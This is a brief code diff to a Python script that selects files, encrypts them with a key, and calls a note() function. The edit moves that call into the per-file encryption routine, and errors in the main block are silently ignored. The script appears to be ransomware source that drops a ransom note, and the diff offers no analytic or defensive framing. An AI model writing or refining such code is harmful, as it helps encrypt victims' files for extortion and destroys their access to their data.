@@ -70,6 +70,7 @@ def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
 
 def single_arg_encrypt_file(in_filename):
     encrypt_file(key, in_filename)
+    note()
 
 def selectfiles():
     files_to_enc = []
@@ -123,7 +124,6 @@ if __name__=="__main__":
 	
 	try:
 		selectfiles()
-		note()
 	except Exception as e:
 		pass
 	
